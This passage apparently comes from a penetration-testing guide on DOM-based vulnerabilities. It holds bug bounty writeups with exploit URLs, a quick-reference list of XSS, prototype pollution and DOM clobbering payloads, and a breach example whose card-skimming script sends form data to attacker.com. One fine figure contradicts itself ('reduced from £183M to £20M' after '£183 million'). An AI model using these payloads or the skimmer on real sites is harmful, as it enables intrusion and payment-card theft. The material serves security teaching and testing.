```json
{
    "__proto__": {
        "isAdmin": true
    }
}
```

### Bug Bounty Writeups

#### Google DOM XSS via postMessage

**Finding:**
- Google service accepted postMessage without origin validation
- Message data was passed to eval()

**Exploit:**
```html
<iframe src="https://vulnerable.google.com/page"></iframe>
<script>
    frames[0].postMessage('alert(document.domain)', '*');
</script>
```

**Bounty:** $5,000

#### Facebook Prototype Pollution

**Finding:**
- URL parameter parsing allowed `__proto__` injection
- Gadget found in error handling code

**Exploit:**
```
https://facebook.com/page?__proto__[transport_url]=data:,alert(document.domain);//
```

**Bounty:** $10,000

#### Microsoft Teams DOM XSS

**Finding:**
- Teams web app reflected URL fragments into page
- AngularJS expression injection possible

**Exploit:**
```
https://teams.microsoft.com/#{{constructor.constructor('alert(1)')()}}
```

**Bounty:** $15,000

### Notable Breaches

#### British Airways (2018)

**Attack:**
- Attackers injected malicious JavaScript via DOM XSS
- Script harvested payment card details
- 380,000 customers affected

**Technique:**
```javascript
// Injected script
(function() {
    document.forms[0].addEventListener('submit', function(e) {
        let formData = new FormData(e.target);
        fetch('https://attacker.com/collect', {
            method: 'POST',
            body: formData
        });
    });
})();
```

**Fine:** £183 million (reduced from £183M to £20M)

#### Ticketmaster (2018)

**Attack:**
- Third-party chatbot widget vulnerable to DOM XSS
- Attacker injected payment card skimmer
- 40,000 customers affected

**Impact:**
- £1.25 million fine
- Reputation damage
- Legal settlements

### Security Research

#### PortSwigger Research: DOM Clobbering Strikes Back

**Key findings:**
- Many sanitization libraries vulnerable to DOM clobbering
- HTMLJanitor, sanitize-html affected
- New gadgets discovered in popular frameworks

**Exploitation technique:**
```html
<form id=settings><input id=attributes></form>
```

#### Google Project Zero: Prototype Pollution in Node.js

**Key findings:**
- Prototype pollution possible via CLI arguments
- Affected multiple Node.js packages
- Could lead to RCE in server environments

**Example:**
```bash
node app.js --__proto__.isAdmin=true
```

---

## Quick Reference {#quick-reference}

### Common Payloads by Context

#### HTML Context
```html
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<iframe src="javascript:alert(1)">
<details open ontoggle=alert(1)>
<input onfocus=alert(1) autofocus>
```

#### Attribute Context
```html
" onclick="alert(1)
' onfocus='alert(1)' autofocus='
" onfocus="alert(1)" autofocus="
```

#### JavaScript String
```javascript
'; alert(1); //
\'; alert(1); //
'-alert(1)-'
```

#### innerHTML Sink
```html
<img src=x onerror=alert(1)>
<svg><animate onbegin=alert(1) attributeName=x dur=1s>
```

#### jQuery Selector
```html
<img src=x onerror=alert(1)>
```

#### AngularJS
```javascript
{{$on.constructor('alert(1)')()}}
{{constructor.constructor('alert(1)')()}}
```

#### Prototype Pollution
```
/?__proto__[property]=value
/?__proto__.property=value
```

#### DOM Clobbering
```html
<a id=variable></a>
<a id=obj><a id=obj name=prop href=value>
<form id=x><input id=attributes></form>
```

#### Web Messages
```html
<iframe src="https://target.com" onload="this.contentWindow.postMessage('payload','*')"></iframe>
```

### Testing Checklist

- [ ] Identify user input sources (URL, hash, cookies, etc.)
- [ ] Find dangerous sinks (innerHTML, eval, etc.)
- [ ] Trace data flow from source to sink
- [ ] Determine context (HTML, attribute, JS, URL)
- [ ] Craft appropriate payload
- [ ] Test for encoding/sanitization
- [ ] Verify execution
- [ ] Test in different browsers
- [ ] Check for CSP restrictions
- [ ] Document finding

### Burp Suite DOM Invader Workflow

1. Enable DOM Invader in Burp's browser
2. Navigate to target application
3. Check "Sources" panel for injection points
4. Check "Sinks" panel for dangerous functions
5. Scan for prototype pollution
6. Scan for gadgets
7. Check for DOM clobbering opportunities
8. Generate and test exploits
9. Verify in different contexts

---

## Industry Standards and Compliance

### OWASP Top 10

**A03:2021 – Injection**
- DOM-based XSS falls under injection attacks
- Requires input validation and output encoding

### CWE References

- **CWE-79:** Improper Neutralization of Input During Web Page Generation (XSS)
- **CWE-85:** Doubled Character XSS Manipulations
- **CWE-87:** Improper Neutralization of Alternate XSS Syntax
- **CWE-94:** Improper Control of Generation of Code (Code Injection)
- **CWE-95:** Improper Neutralization of Directives in Dynamically Evaluated Code (eval Injection)

### MITRE ATT&CK

**Technique:** T1189 - Drive-by Compromise
**Tactic:** Initial Access

**Technique:** T1059 - Command and Scripting Interpreter
**Sub-technique:** T1059.007 - JavaScript

### PCI DSS Requirements

**Requirement 6.5.7:** Cross-site scripting (XSS)
- Applications must validate input
- Encode output appropriately
- Implement CSP where possible

---

## References and Further Reading

### Official Documentation

- [PortSwigger Web Security Academy - DOM-based vulnerabilities](https://portswigger.net/web-security/dom-based)
- [OWASP - DOM based XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html)
- [MDN - postMessage API](https://developer.mozilla.org/en-US/docs/Web/API/Window/postMessage)

### Research Papers

- "Postcards from the Post-XSS World" - Mike Samuel, Google
- "DOM Clobbering Strikes Back" - Gareth Heyes, PortSwigger
- "Prototype Pollution: Exploitation Techniques" - Olivier Arteau

### Tools

- [Burp Suite](https://portswigger.net/burp) - Professional web security testing
- [OWASP ZAP](https://www.zaproxy.org/) - Open-source security scanner
- [XSStrike](https://github.com/s0md3v/XSStrike) - XSS detection suite
- [DalFox](https://github.com/hahwul/dalfox) - Fast parameter analysis and XSS scanner
- [DOMPurify](https://github.com/cure53/DOMPurify) - DOM-only XSS sanitizer
- [XSS Hunter](https://xsshunter.com/) - Blind XSS detection platform

### Communities

- [PortSwigger Research](https://portswigger.net/research)
- [HackerOne Hacktivity](https://hackerone.com/hacktivity)
- [Bugcrowd Vulnerability Disclosure Program](https://www.bugcrowd.com/)
- [OWASP Slack](https://owasp.org/slack/invite)

---

**Document Version:** 1.0
**Last Updated:** 2026-01-09
**Skill:** pentest
**Topic:** DOM-Based Vulnerabilities

---

*This guide is part of the comprehensive penetration testing skill documentation. For other attack types, see the `reference/` directory.*
